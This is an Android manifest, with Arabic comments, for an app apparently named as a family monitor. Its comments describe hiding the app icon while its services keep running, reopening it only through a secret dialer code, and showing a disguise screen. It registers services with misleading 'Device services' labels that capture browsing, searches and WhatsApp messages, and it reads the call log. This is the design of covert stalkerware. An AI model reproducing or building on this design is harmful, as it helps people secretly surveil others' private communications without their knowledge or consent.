<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <!-- صلاحية إحصاء استخدام التطبيقات (تُمنح من إعدادات النظام) -->
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions" />
    <!-- رصد فتح التطبيقات -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.Material3.DayNight">

        <!--
            أيقونة القاذف عبر alias — لإخفاء الأيقونة نعطّل هذا المكوّن فقط
            (Prefs.setIconHidden) فتختفي الأيقونة من قائمة التطبيقات وتظل الخدمات شغالة،
            والعودة للإعدادات تكون بالكود السري *#*#7594#*#* من لوحة الاتصال.
        -->
        <activity-alias
            android:name="com.family.monitor.LauncherAlias"
            android:enabled="true"
            android:exported="true"
            android:icon="@mipmap/ic_launcher"
            android:label="@string/app_name"
            android:targetActivity=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <activity
            android:name=".MainActivity"
            android:exported="true" />

        <!--
            الكود السري من لوحة الاتصال: *#*#7594#*#*
            يفتح شاشة التمويه — الطريقة الوحيدة لفتح التطبيق بعد إخفاء الأيقونة.
        -->
        <receiver
            android:name=".SecretCodeReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE" />
                <data android:scheme="android_secret_code" android:host="7594" />
            </intent-filter>
        </receiver>

        <!-- شاشة إعداد الجهاز الفرعي (كود الاقتران والمراقبة) -->
        <activity
            android:name=".SetupActivity"
            android:exported="false" />

        <!-- شاشة التمويه: تظهر بعد التفعيل — بريئة بزر واحد يطلب كلمة مرور الأدمن -->
        <activity
            android:name=".DisguiseActivity"
            android:exported="false"
            android:excludeFromRecents="false" />

        <!-- شاشة الجهاز الأساسي: لوحة المتابعة داخل التطبيق -->
        <activity
            android:name=".WebPanelActivity"
            android:exported="false"
            android:configChanges="orientation|screenSize|keyboardHidden|screenLayout" />

        <!-- خدمة المراقبة الأمامية -->
        <service
            android:name=".MonitorService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- خدمة إمكانية الوصول: لرصد عناوين المواقع وعمليات البحث (تعمل أيضًا في الوضع الخفي) -->
        <service
            android:name=".UrlAccessibilityService"
            android:exported="false"
            android:label="خدمات الجهاز"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- خدمة الإشعارات: لرصد رسائل واتساب المستلمة -->
        <service
            android:name=".WhatsappNotificationService"
            android:exported="false"
            android:label="خدمات الجهاز"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
    </application>
</manifest>
